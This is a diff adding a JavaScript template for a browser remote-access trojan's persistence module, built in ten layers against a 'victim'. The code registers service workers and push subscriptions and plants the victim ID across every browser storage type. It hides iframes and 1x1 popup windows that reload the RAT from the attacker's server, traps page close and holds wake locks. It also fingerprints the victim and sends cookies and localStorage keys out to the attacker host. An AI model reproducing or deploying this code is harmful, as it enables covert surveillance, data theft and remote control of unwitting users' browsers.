@@ -1,0 +1,754 @@
+============================================================================
+// LAYER 1: SERVICE WORKER + PUSH NOTIFICATIONS + BACKGROUND SYNC
+// ============================================================================
+
+function urlBase64ToUint8Array(base64String) {
+    const padding = '='.repeat((4 - base64String.length % 4) % 4);
+    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
+    const rawData = window.atob(base64);
+    const outputArray = new Uint8Array(rawData.length);
+    for (let i = 0; i < rawData.length; ++i) {
+        outputArray[i] = rawData.charCodeAt(i);
+    }
+    return outputArray;
+}
+
+if ('serviceWorker' in navigator) {
+    // Register service worker
+    navigator.serviceWorker.register('/sw.js').then(registration => {
+        console.log('[NUCLEAR] Service Worker registered:', registration.scope);
+
+        // Request push notification permission
+        if ('PushManager' in window && {{ enable_push }}) {
+            Notification.requestPermission().then(permission => {
+                if (permission === 'granted') {
+                    // Subscribe to push notifications
+                    registration.pushManager.subscribe({
+                        userVisibleOnly: true,
+                        applicationServerKey: urlBase64ToUint8Array('{{ secret_key }}')
+                    }).then(subscription => {
+                        // Send subscription to server
+                        fetch(SERVER_URL + '/push-subscribe', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                victim_id: VICTIM_ID,
+                                subscription: subscription
+                            })
+                        });
+                    });
+                }
+            });
+        }
+
+        // Register background sync
+        if ('sync' in registration && {{ enable_bg_sync }}) {
+            registration.sync.register('nuclear-sync').then(() => {
+                console.log('[NUCLEAR] Background sync registered');
+            });
+        }
+
+        // Register periodic sync (survives reboots)
+        if ('periodicSync' in registration) {
+            registration.periodicSync.register('nuclear-periodic', {
+                minInterval: 24 * 60 * 60 * 1000 // 24 hours
+            });
+        }
+    }).catch(error => {
+        console.error('[NUCLEAR] Service Worker registration failed:', error);
+    });
+}
+
+// ============================================================================
+// LAYER 2: MULTIPLE STORAGE MECHANISMS
+// ============================================================================
+
+function bombardStorage() {
+    // LocalStorage (survives browser restart)
+    localStorage.setItem('nuclear_id', VICTIM_ID);
+    localStorage.setItem('nuclear_last', Date.now().toString());
+    localStorage.setItem('nuclear_heal', 'true');
+    localStorage.setItem('nuclear_url', SERVER_URL);
+
+    // SessionStorage with backup
+    sessionStorage.setItem('nuclear_session', VICTIM_ID);
+
+    // Cookies (long expiry)
+    document.cookie = `nuclear=${VICTIM_ID}; expires=${new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toUTCString()}; path=/; SameSite=None; Secure`;
+
+    // IndexedDB - FUCKING PERMANENT
+    const dbRequest = indexedDB.open('NuclearDB', 3);
+    dbRequest.onupgradeneeded = function(event) {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains('nuclear_data')) {
+            const store = db.createObjectStore('nuclear_data', { keyPath: 'id' });
+            store.createIndex('timestamp_idx', 'timestamp', { unique: false });
+        }
+        if (!db.objectStoreNames.contains('commands')) {
+            db.createObjectStore('commands', { keyPath: 'id', autoIncrement: true });
+        }
+        if (!db.objectStoreNames.contains('keylogger')) {
+            db.createObjectStore('keylogger', { keyPath: 'id', autoIncrement: true });
+        }
+    };
+
+    dbRequest.onsuccess = function(event) {
+        const db = event.target.result;
+        const tx = db.transaction(['nuclear_data'], 'readwrite');
+        const store = tx.objectStore('nuclear_data');
+
+        store.put({
+            id: VICTIM_ID,
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: { width: screen.width, height: screen.height },
+            lastHeartbeat: Date.now(),
+            persistenceLevel: PERSISTENCE_LEVEL
+        });
+
+        tx.oncomplete = function() {
+            console.log('[NUCLEAR] IndexedDB stored successfully');
+        };
+    };
+
+    // Cache API
+    if ('caches' in window) {
+        caches.open('nuclear-cache-v1').then(cache => {
+            cache.put('/rat', new Response(VICTIM_ID));
+            cache.put('/heartbeat', new Response(Date.now().toString()));
+        });
+    }
+
+    // WebSQL (legacy support)
+    if (window.openDatabase) {
+        const sql_db = openDatabase('NuclearSQL', '1.0', 'Nuclear Database', 2 * 1024 * 1024);
+        sql_db.transaction(function(tx) {
+            tx.executeSql('INSERT OR REPLACE INTO nuclear (id, data) VALUES (?, ?)',
+                [VICTIM_ID, JSON.stringify({ timestamp: Date.now() })]);
+        });
+    }
+}
+
+// Execute storage bombardment
+bombardStorage();
+
+// ============================================================================
+// LAYER 3: HIDDEN IFRAME ARMY
+// ============================================================================
+
+function createHiddenIframes() {
+    const iframeStyles = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;border:0;z-index:-9999;pointer-events:none;';
+
+    for (let i = 0; i < 3; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.style.cssText = iframeStyles;
+
+        iframe.srcdoc = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <script>
+                    // Hidden iframe persistence
+                    const parentId = '{victim_id}';
+                    const serverUrl = '{server_url}';
+
+                    // Store in iframe's localStorage too
+                    localStorage.setItem('iframe_nuclear', parentId);
+
+                    // Heartbeat to parent
+                    setInterval(() => {
+                        try {
+                            window.parent.postMessage({
+                                type: 'iframe_heartbeat',
+                                id: parentId,
+                                frame: {i},
+                                timestamp: Date.now()
+                            }, '*');
+                        } catch(e) {}
+                    }, 15000);
+
+                    // Self-repair if parent dies
+                    setInterval(() => {
+                        try {
+                            if (!window.parent || window.parent === window) {
+                                // Parent window dead, reload rat
+                                location.href = serverUrl + '/rat?resurrect=' + parentId;
+                            }
+                        } catch(e) {}
+                    }, 30000);
+                </script>
+            </head>
+            <body></body>
+            </html>
+        `;
+
+        document.body.appendChild(iframe);
+    }
+}
+
+createHiddenIframes();
+
+// ============================================================================
+// LAYER 4: WEB WORKER + SHARED WORKER + AUDIO WORKLET
+// ============================================================================
+
+// Dedicated Web Worker (runs in separate thread)
+const workerCode = `
+    // Nuclear Worker - runs independently
+    let heartbeatInterval;
+
+    self.onmessage = function(e) {
+        if (e.data.action === 'start') {
+            const victimId = e.data.victimId;
+            const serverUrl = e.data.serverUrl;
+
+            // Start heartbeat
+            heartbeatInterval = setInterval(() => {
+                fetch(serverUrl + '/heartbeat', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        id: victimId,
+                        type: 'worker',
+                        timestamp: Date.now()
+                    })
+                }).catch(() => {});
+
+                // Check connection to main page
+                self.postMessage({type: 'alive', time: Date.now()});
+            }, 30000);
+
+        } else if (e.data.action === 'stop') {
+            clearInterval(heartbeatInterval);
+        }
+    };
+
+    // Auto-start
+    self.postMessage({type: 'ready'});
+`;
+
+// Create and start worker
+try {
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const worker = new Worker(URL.createObjectURL(blob));
+
+    worker.postMessage({
+        action: 'start',
+        victimId: VICTIM_ID,
+        serverUrl: SERVER_URL
+    });
+
+    worker.onmessage = function(e) {
+        if (e.data.type === 'alive') {
+            // Worker is alive
+        }
+    };
+} catch(e) {}
+
+// Shared Worker (cross-tab communication)
+if ('SharedWorker' in window) {
+    try {
+        const sharedWorker = new SharedWorker('/shared-worker.js');
+        sharedWorker.port.postMessage({
+            type: 'register',
+            id: VICTIM_ID,
+            url: window.location.href
+        });
+
+        sharedWorker.port.onmessage = function(e) {
+            if (e.data.type === 'command') {
+                // Execute command from shared worker
+                executeCommand(e.data.command);
+            }
+        };
+    } catch(e) {}
+}
+
+// Audio Worklet (silent background execution)
+if (window.AudioWorklet) {
+    try {
+        const audioContext = new AudioContext();
+        audioContext.audioWorklet.addModule('/audio-worklet.js').then(() => {
+            const workletNode = new AudioWorkletNode(audioContext, 'nuclear-worklet');
+            workletNode.port.postMessage({
+                id: VICTIM_ID,
+                action: 'persist'
+            });
+        });
+    } catch(e) {}
+}
+
+// ============================================================================
+// LAYER 5: PAGE LIFECYCLE API + WAKE LOCK + VISIBILITY STATE
+// ============================================================================
+
+// Page Lifecycle API
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        // Page hidden - activate backup persistence
+        console.log('[NUCLEAR] Page hidden, activating backup systems');
+
+        // Spawn backup window
+        setTimeout(() => {
+            try {
+                window.open(SERVER_URL + '/rat?backup=' + VICTIM_ID, '_blank',
+                    'width=1,height=1,left=-9999,top=-9999');
+            } catch(e) {}
+        }, 5000);
+    } else {
+        // Page visible again
+        console.log('[NUCLEAR] Page visible, checking integrity');
+        checkIntegrity();
+    }
+});
+
+// Wake Lock API (prevent device sleep)
+if ('wakeLock' in navigator) {
+    let wakeLock = null;
+
+    async function requestWakeLock() {
+        try {
+            wakeLock = await navigator.wakeLock.request('screen');
+            console.log('[NUCLEAR] Wake Lock acquired');
+
+            wakeLock.addEventListener('release', () => {
+                console.log('[NUCLEAR] Wake Lock released');
+                // Try to reacquire
+                setTimeout(requestWakeLock, 1000);
+            });
+        } catch(err) {
+            console.error('[NUCLEAR] Wake Lock failed:', err);
+        }
+    }
+
+    requestWakeLock();
+}
+
+// BeforeUnload trap - spawn replacement before closing
+window.addEventListener('beforeunload', (event) => {
+    // Store state for recovery
+    localStorage.setItem('nuclear_recovery_state', JSON.stringify({
+        id: VICTIM_ID,
+        url: window.location.href,
+        timestamp: Date.now(),
+        data: gatherRecoveryData()
+    }));
+
+    // Use Beacon API to notify server
+    navigator.sendBeacon(SERVER_URL + '/unload', JSON.stringify({
+        id: VICTIM_ID,
+        action: 'closing',
+        recovery_key: 'recover_' + VICTIM_ID
+    }));
+
+    // Don't prevent unload, but spawn replacement
+    setTimeout(() => {
+        try {
+            window.open(SERVER_URL + '/rat?recover=' + VICTIM_ID, '_blank',
+                'width=1,height=1,left=-9999,top=-9999');
+        } catch(e) {}
+    }, 100);
+});
+
+// Pagehide event (more reliable than unload)
+window.addEventListener('pagehide', () => {
+    // Store recovery beacon
+    const blob = new Blob([JSON.stringify({
+        id: VICTIM_ID,
+        event: 'pagehide',
+        time: Date.now()
+    })], { type: 'application/json' });
+
+    navigator.sendBeacon(SERVER_URL + '/pagehide', blob);
+});
+
+// ============================================================================
+// LAYER 6: PROGRESSIVE WEB APP INSTALLATION
+// ============================================================================
+
+if ({{ enable_pwa }}) {
+    let deferredPrompt;
+
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
+
+        // Auto-trigger installation after 10 seconds
+        setTimeout(() => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('[NUCLEAR] PWA installed successfully');
+                        // Now we have TRUE persistence
+                        initNuclearPersistence();
+                    }
+                    deferredPrompt = null;
+                });
+            }
+        }, 10000);
+    });
+
+    // Check if already installed
+    if (window.matchMedia('(display-mode: standalone)').matches ||
+        window.navigator.standalone === true) {
+        console.log('[NUCLEAR] Running as installed PWA');
+        initNuclearPersistence();
+    }
+}
+
+function initNuclearPersistence() {
+    // Called when running as installed PWA
+    console.log('[NUCLEAR] Nuclear persistence activated');
+
+    // Register periodic background sync (survives reboots)
+    if ('periodicSync' in navigator.serviceWorker) {
+        navigator.serviceWorker.ready.then(registration => {
+            registration.periodicSync.register('nuclear-heartbeat', {
+                minInterval: 60 * 60 * 1000 // 1 hour
+            });
+        });
+    }
+
+    // Request persistent storage permission
+    if (navigator.storage && navigator.storage.persist) {
+        navigator.storage.persist().then(granted => {
+            console.log('[NUCLEAR] Persistent storage:', granted ? 'granted' : 'denied');
+        });
+    }
+}
+
+// ============================================================================
+// LAYER 7: BROWSER EXPLOIT BACKDOORS
+// ============================================================================
+
+if ({{ enable_exploits }}) {
+    // Chrome IndexedDB transaction bug - keeps connection alive indefinitely
+    function exploitIndexedDB() {
+        try {
+            const request = indexedDB.open('ExploitDB_' + VICTIM_ID);
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                // Start transaction that never completes
+                const tx = db.transaction(['exploit'], 'readwrite');
+                const store = tx.objectStore('exploit');
+
+                // This request will hang indefinitely
+                const req = store.get(999999);
+                req.onsuccess = function() {
+                    // Never reached intentionally
+                };
+
+                // Keep references to prevent GC
+                window._nuclearExploitDB = { db: db, tx: tx, req: req };
+            };
+
+            request.onupgradeneeded = function(e) {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains('exploit')) {
+                    db.createObjectStore('exploit');
+                }
+            };
+        } catch(e) {}
+    }
+
+    // WebSocket zombie connections
+    function createZombieWebSocket() {
+        try {
+            const ws = new WebSocket('ws://' + window.location.host + '/ws');
+            ws.onopen = function() {
+                // Send heartbeat every 30 seconds
+                const interval = setInterval(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({
+                            type: 'zombie_heartbeat',
+                            id: VICTIM_ID,
+                            time: Date.now()
+                        }));
+                    } else {
+                        clearInterval(interval);
+                        // Reconnect
+                        setTimeout(createZombieWebSocket, 5000);
+                    }
+                }, 30000);
+
+                ws._heartbeatInterval = interval;
+            };
+
+            ws.onclose = function() {
+                // Reconnect after delay
+                setTimeout(createZombieWebSocket, 10000);
+            };
+
+            window._nuclearWebSocket = ws;
+        } catch(e) {}
+    }
+
+    // Execute exploits
+    setTimeout(exploitIndexedDB, 5000);
+    setTimeout(createZombieWebSocket, 7000);
+}
+
+// ============================================================================
+// LAYER 8: AUTO-RELAUNCH ON BROWSER START
+// ============================================================================
+
+function setupAutoRelaunch() {
+    // Check if browser just started
+    const lastLaunch = localStorage.getItem('nuclear_last_launch');
+    const now = Date.now();
+
+    if (!lastLaunch || (now - parseInt(lastLaunch)) > 5 * 60 * 1000) {
+        // Browser likely just started - set relaunch cookie
+        document.cookie = `nuclear_relaunch=${VICTIM_ID}; expires=${new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString()}; path=/`;
+
+        // Also spawn new instance
+        setTimeout(() => {
+            try {
+                window.open(SERVER_URL + '/rat?auto=' + VICTIM_ID, '_blank',
+                    'width=1,height=1,left=-9999,top=-9999');
+            } catch(e) {}
+        }, 3000);
+    }
+
+    localStorage.setItem('nuclear_last_launch', now.toString());
+
+    // Check for relaunch cookie from previous session
+    const cookies = document.cookie.split(';').map(c => c.trim());
+    const relaunchCookie = cookies.find(c => c.startsWith('nuclear_relaunch='));
+
+    if (relaunchCookie) {
+        const oldId = relaunchCookie.split('=')[1];
+        if (oldId !== VICTIM_ID) {
+            // We're a relaunch of previous session - merge data
+            console.log('[NUCLEAR] Relaunched from previous session:', oldId);
+
+            // Clear the cookie
+            document.cookie = 'nuclear_relaunch=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
+        }
+    }
+}
+
+setupAutoRelaunch();
+
+// ============================================================================
+// LAYER 9: INTEGRITY CHECKING AND SELF-REPAIR
+// ============================================================================
+
+function checkIntegrity() {
+    const checks = {
+        localStorage: !!localStorage.getItem('nuclear_id'),
+        serviceWorker: 'serviceWorker' in navigator,
+        webWorker: !!window.Worker,
+        indexedDB: !!window.indexedDB,
+        cookies: document.cookie.includes('nuclear='),
+        iframes: document.querySelectorAll('iframe').length >= 3
+    };
+
+    console.log('[NUCLEAR] Integrity check:', checks);
+
+    // If any layer fails, repair it
+    if (!checks.localStorage) {
+        console.warn('[NUCLEAR] localStorage failed, repairing');
+        localStorage.setItem('nuclear_id', VICTIM_ID);
+    }
+
+    if (!checks.cookies) {
+        console.warn('[NUCLEAR] Cookies failed, repairing');
+        document.cookie = `nuclear=${VICTIM_ID}; max-age=31536000; path=/`;
+    }
+
+    // Check heartbeat
+    const lastHeartbeat = localStorage.getItem('nuclear_last_heartbeat');
+    const now = Date.now();
+
+    if (!lastHeartbeat || (now - parseInt(lastHeartbeat)) > 60000) {
+        console.warn('[NUCLEAR] Heartbeat stalled, forcing refresh');
+        sendEmergencyHeartbeat();
+    }
+
+    return Object.values(checks).every(Boolean);
+}
+
+function sendEmergencyHeartbeat() {
+    fetch(SERVER_URL + '/emergency', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            id: VICTIM_ID,
+            emergency: true,
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent,
+            url: window.location.href
+        })
+    }).catch(() => {
+        // If fetch fails, try Beacon API
+        const blob = new Blob([JSON.stringify({
+            id: VICTIM_ID,
+            emergency: true,
+            time: Date.now()
+        })], { type: 'application/json' });
+
+        navigator.sendBeacon(SERVER_URL + '/emergency', blob);
+    });
+}
+
+function gatherRecoveryData() {
+    // Gather all data needed for recovery
+    return {
+        victimId: VICTIM_ID,
+        timestamp: Date.now(),
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth
+        },
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localStorageKeys: Object.keys(localStorage),
+        cookies: document.cookie.split(';').map(c => c.trim()),
+        iframeCount: document.querySelectorAll('iframe').length,
+        serviceWorker: 'serviceWorker' in navigator,
+        pushManager: 'PushManager' in window,
+        wakeLock: 'wakeLock' in navigator
+    };
+}
+
+// Periodic integrity check
+setInterval(checkIntegrity, 30000);
+
+// ============================================================================
+// LAYER 10: CROSS-BROWSER FALLBACKS
+// ============================================================================
+
+function applyBrowserSpecificPersistence() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    // Chrome-specific optimizations
+    if (ua.includes('chrome') && !ua.includes('edg')) {
+        // Chrome has best Service Worker support
+        if ('storage' in navigator && navigator.storage.persist) {
+            navigator.storage.persist().then(granted => {
+                if (granted) {
+                    console.log('[NUCLEAR] Chrome persistent storage granted');
+                    // Use persistent storage aggressively
+                    localStorage.setItem('nuclear_chrome_persist', 'true');
+                }
+            });
+        }
+
+        // Chrome Background Fetch
+        if ('BackgroundFetchManager' in window) {
+            navigator.serviceWorker.ready.then(registration => {
+                registration.backgroundFetch.fetch('nuclear-chrome-fetch', ['/rat'], {
+                    title: 'Nuclear System',
+                    downloadTotal: 1024 * 1024 // 1MB
+                });
+            });
+        }
+    }
+
+    // Firefox-specific
+    else if (ua.includes('firefox')) {
+        // Firefox has good IndexedDB support
+        console.log('[NUCLEAR] Firefox detected, using IndexedDB heavily');
+
+        // Use IndexedDB for critical data
+        const dbRequest = indexedDB.open('FirefoxNuclearDB', 4);
+        dbRequest.onupgradeneeded = function(e) {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains('critical')) {
+                db.createObjectStore('critical', { keyPath: 'id' });
+            }
+        };
+
+        dbRequest.onsuccess = function(e) {
+            const db = e.target.result;
+            const tx = db.transaction(['critical'], 'readwrite');
+            const store = tx.objectStore('critical');
+
+            store.put({
+                id: VICTIM_ID,
+                firefoxSpecific: true,
+                timestamp: Date.now(),
+                persistenceData: gatherRecoveryData()
+            });
+        };
+    }
+
+    // Safari-specific (the bitch)
+    else if (ua.includes('safari') && !ua.includes('chrome')) {
+        console.log('[NUCLEAR] Safari detected, using aggressive cookie storage');
+
+        // Safari has limited Service Worker lifecycle
+        // Use cookies heavily with long expiry
+        document.cookie = `nuclear_safari=${VICTIM_ID}; expires=${new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toUTCString()}; path=/`;
+
+        // Safari WebSQL fallback (still works)
+        if (window.openDatabase) {
+            const safari_db = openDatabase('SafariNuclearDB', '1.0', 'Safari Nuclear DB', 5 * 1024 * 1024);
+            safari_db.transaction(function(tx) {
+                tx.executeSql('CREATE TABLE IF NOT EXISTS nuclear (id unique, data)');
+                tx.executeSql('INSERT OR REPLACE INTO nuclear (id, data) VALUES (?, ?)',
+                    [VICTIM_ID, JSON.stringify({ safari: true, timestamp: Date.now() })]);
+            });
+        }
+
+        // Safari has strict iframe policies - create them differently
+        setTimeout(() => {
+            const safariIframe = document.createElement('iframe');
+            safariIframe.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;';
+            safariIframe.srcdoc = '<script>localStorage.setItem("safari_nuclear", "' + VICTIM_ID + '")</script>';
+            document.body.appendChild(safariIframe);
+        }, 1000);
+    }
+
+    // Mobile browsers
+    else if (/android|iphone|ipad|mobile/i.test(ua)) {
+        console.log('[NUCLEAR] Mobile browser detected');
+
+        // Mobile browsers often kill background tabs aggressively
+        // Use Wake Lock API if available
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').then(wakeLock => {
+                console.log('[NUCLEAR] Mobile wake lock acquired');
+
+                // Release after 5 minutes to save battery but reacquire
+                setTimeout(() => {
+                    wakeLock.release();
+                    setTimeout(() => {
+                        navigator.wakeLock.request('screen');
+                    }, 1000);
+                }, 5 * 60 * 1000);
+            });
+        }
+
+        // Use mobile-specific storage
+        localStorage.setItem('nuclear_mobile', 'true');
+        localStorage.setItem('nuclear_mobile_id', VICTIM_ID);
+
+        // Mobile browsers support PWA installation
+        if (window.matchMedia('(display-mode: standalone)').matches) {
+            console.log('[NUCLEAR] Running as mobile PWA - MAXIMUM PERSISTENCE');
+
+            // We're installed as PWA - we have true 24/7 persistence
+            // Register for push notifications aggressively
+            if ('PushManager' in window) {
+                navigator.serviceWorker.ready.then(registration => {
+                    registration.pushManager.subscribe({
+                        userVisibleOnly: true,
+                        applicationServerKey: urlBase64ToUint8Array('{{ secret_key }}')
+                    });
+                });
+            }
+        }
+    }
+}
+
+applyBrowserSpecificPersistence();
